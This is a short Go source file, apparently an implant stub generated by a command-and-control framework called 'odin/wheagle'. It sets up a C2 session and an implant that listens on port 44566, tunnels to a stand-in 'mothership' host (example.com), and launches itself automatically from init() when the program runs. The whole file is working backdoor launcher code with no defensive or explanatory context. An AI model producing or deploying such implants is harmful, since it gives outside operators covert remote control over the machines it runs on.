package main
import (
  "odin/lib/c2"
  "odin/wheagle/server/agent"
)

func init(){
  session := &c2.Session{
    ID: "7743a0786df1e62ccdda6a5f7b16f5e7",
    MotherShipID:"example.com",
    Expiry: "2024-03-28 06:05:42.145875631 +0300 EAT",
    Active: true,
    SessionID:"7743a0786df1e62ccdda6a5f7b16f5e7",
  }
  implant := &agent.Implant{
    Address: "0.0.0.0:44566",
    TunnelAddress: "example.com",
    ISession: session,
  }
  implant.RunImplant()
}
func main(){}
